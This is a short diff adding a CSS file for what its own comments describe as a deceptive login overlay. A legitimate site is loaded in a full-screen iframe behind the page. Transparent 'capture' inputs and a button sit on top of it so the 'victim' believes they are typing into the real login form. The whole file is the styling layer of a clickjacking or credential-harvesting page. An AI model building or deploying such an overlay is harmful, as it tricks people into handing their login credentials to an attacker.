@@ -1,0 +1,29 @@
+/* Stretch the iframe to fill the viewport behind everything */
+iframe {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+  z-index: -1;
+}
+
+/* Overlay container — positioned to sit on top of the iframe */
+.overlay {
+  position: absolute;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+/*
+ * The inputs and button are transparent so the victim sees only
+ * the legitimate site beneath them and thinks they are interacting
+ * with the real login form.
+ */
+.capture-input,
+.capture-btn {
+  opacity: 0;
+  cursor: default;
+}
